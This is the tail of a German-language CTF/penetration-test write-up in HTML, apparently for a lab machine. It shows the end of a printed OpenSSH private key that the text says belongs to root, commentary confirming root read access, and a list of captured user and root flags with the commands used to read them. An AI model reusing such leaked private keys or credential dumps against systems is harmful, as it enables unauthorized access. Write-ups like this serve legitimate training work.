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
+s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+</div>
+</div>
+<p class="analysis">Analyse: Als root werden die User-Flag (/home/cris/user.txt) und der Inhalt der zuvor erstellten Datei id (/home/cris/id), die den privaten SSH-Schlüssel von Root enthält, erneut angezeigt. Dies dient lediglich der Vollständigkeit und Demonstration der Root-Rechte.</p>
+<p class="evaluation">Bewertung: Bestätigt den Lesezugriff als Root auf die entsprechenden Dateien.</p>
+<p class="recommendation">Empfehlung (Pentester): Keine weiteren Aktionen nötig, die Flags wurden bereits erfasst.
+<br>Empfehlung (Admin): Keine spezifischen Maßnahmen für diesen Schritt, siehe allgemeine Empfehlungen zur Systemkompromittierung.</p>
+
+</section>
+
+
+    <!-- Flags Section -->
+    <section id="flags">
+        <div class="flag-container">
+            <h2 class="flag-heading">Flags</h2>
+            <div class="flag-entry">
+                <!-- Befehl nicht explizit im Log, aber impliziert -->
+                <div class="flag-command">cat /home/cris/user.txt</div>
+                <div class="flag-value"><span class="password">eG4TUsTBxSFjTPHMV</span></div>
+            </div>
+            <div class="flag-entry">
+                <div class="flag-command">cat /root/root_fl4g.txt</div>
+                <div class="flag-value"><span class="password">wRt2xlFjcYqXXo4HMV</span></div>
+            </div>
+        </div>
+    </section> 
+<footer class="footer">
+    <p>DarkSpirit - Cyber Security Reports</p>
+    <!-- Datum aus den Logs extrahiert -->
+    <p>Berichtsdatum: 20. Juni 2023</p>
+</footer> 
+</body>
+</html>
